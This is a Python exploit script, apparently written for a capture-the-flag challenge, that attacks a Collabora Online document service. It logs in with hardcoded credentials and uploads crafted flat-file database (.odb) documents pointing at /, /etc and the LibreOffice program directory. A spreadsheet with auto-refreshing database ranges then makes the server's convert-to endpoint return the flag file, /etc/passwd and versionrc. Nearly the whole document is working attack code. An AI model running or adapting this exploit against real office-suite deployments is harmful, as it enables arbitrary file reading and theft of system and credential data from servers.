#!/usr/bin/env python3
"""Temporary CTF probe: auto-refreshing Calc DB ranges with flat-file ODB sources."""
import html
import http.cookiejar
import io
import re
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
EMAIL = "arena-93aa1301@corp"
PASSWORD = "Arena-93aa1301-CTF!"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def req(path, method="GET", data=None, headers=None, form=None, limit=1000000):
    url = urllib.parse.urljoin(BASE + "/", path)
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers = {**(headers or {}), "Content-Type": "application/x-www-form-urlencoded"}
    request = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with opener.open(request, timeout=90) as r:
            raw = r.read(limit)
            print("HTTP", method, path, "STATUS", r.status, "BYTES", len(raw), "FINAL", r.url, flush=True)
            return r.status, r.url, raw, dict(r.headers)
    except urllib.error.HTTPError as e:
        raw = e.read(limit)
        print("HTTP_ERROR", method, path, e.code, raw.decode("utf-8", "replace"), flush=True)
        return e.code, e.url, raw, dict(e.headers)


def make_odb(directory):
    # No Extension setting: the flat driver then accepts extensionless names such
    # as flag, passwd and versionrc. Disable the header so row 1 is data too.
    connection = "sdbc:flat:file://" + directory
    content = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" office:version="1.2">
<office:body><office:database><db:data-source><db:connection-data>
<db:connection-resource xlink:href="{html.escape(connection, quote=True)}"/>
<db:login db:is-password-required="false"/>
</db:connection-data><db:driver-settings db:is-first-row-header-line="false" db:extension=""/>
<db:application-connection-settings/></db:data-source></office:database></office:body>
</office:document-content>'''
    settings = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2"><office:settings/></office:document-settings>'''
    manifest = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
<manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.database"/>
<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
<manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/>
</manifest:manifest>'''
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as z:
        z.writestr(zipfile.ZipInfo("mimetype"), "application/vnd.oasis.opendocument.database", compress_type=zipfile.ZIP_STORED)
        z.writestr("content.xml", content)
        z.writestr("settings.xml", settings)
        z.writestr("META-INF/manifest.xml", manifest)
    return out.getvalue()


def host_odb(label, directory):
    _, final, _, _ = req("/docs/create", "POST", form={"folder": "", "title": label + ".odb"})
    docid = urllib.parse.urlsplit(final).path.rsplit("/", 1)[-1]
    _, _, editor, _ = req("/edit/" + docid)
    match = re.search(rb'<iframe[^>]+src=["\']([^"\']+)', editor)
    if not match:
        raise RuntimeError("No editor token for " + docid)
    iframe = html.unescape(match.group(1).decode())
    token = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)["access_token"][0]
    query = "?access_token=" + urllib.parse.quote(token, safe="")
    data = make_odb(directory)
    status, _, body, _ = req(
        "/wopi/files/" + docid + "/contents" + query,
        "POST", data,
        {"Content-Type": "application/octet-stream", "X-WOPI-Override": "PUT"},
    )
    print("ODB", label, "DOCID", docid, "DIRECTORY", directory, "PUT_STATUS", status, "PUT_BODY", body.decode("utf-8", "replace"), flush=True)
    # The Collabora kit uses the internal service name, not the public instance.
    return "http://webapp:8000/wopi/files/" + docid + "/contents" + query


def make_fods(sources):
    ranges = []
    for i, (url, table, target) in enumerate(sources):
        statement = f'SELECT * FROM "{table}"'
        ranges.append(f'''<table:database-range table:name="Import{i}" table:target-range-address="{target}" table:contains-header="false" table:refresh-delay="PT1S">
<table:database-source-sql table:database-name="{html.escape(url, quote=True)}" table:sql-statement="{html.escape(statement, quote=True)}"/>
</table:database-range>''')
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
<office:body><office:spreadsheet><table:table table:name="Sheet1">
<table:table-column table:number-columns-repeated="8"/>
<table:table-row table:number-rows-repeated="80"><table:table-cell table:number-columns-repeated="8"/></table:table-row>
</table:table><table:database-ranges>{''.join(ranges)}</table:database-ranges>
</office:spreadsheet></office:body></office:document>'''.encode()


def convert(data):
    boundary = "----Arena" + uuid.uuid4().hex
    body = (f'--{boundary}\r\nContent-Disposition: form-data; name="data"; filename="probe.fods"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode() + data + f"\r\n--{boundary}--\r\n".encode())
    status, _, raw, _ = req(
        "/cool/convert-to/csv", "POST", body,
        {"Content-Type": "multipart/form-data; boundary=" + boundary}, limit=5000000,
    )
    print("\n=== FINAL_CSV STATUS", status, "===\n" + raw.decode("utf-8", "replace"), flush=True)


def main():
    req("/login", "POST", form={"email": EMAIL, "password": PASSWORD})
    root = host_odb("root-flat", "/")
    etc = host_odb("etc-flat", "/etc")
    lo = host_odb("lo-flat", "/lo/program")
    sources = [
        (root, "flag", "Sheet1.A1:Sheet1.A20"),
        (etc, "passwd", "Sheet1.C1:Sheet1.C60"),
        (lo, "versionrc", "Sheet1.E1:Sheet1.E20"),
    ]
    convert(make_fods(sources))


if __name__ == "__main__":
    main()
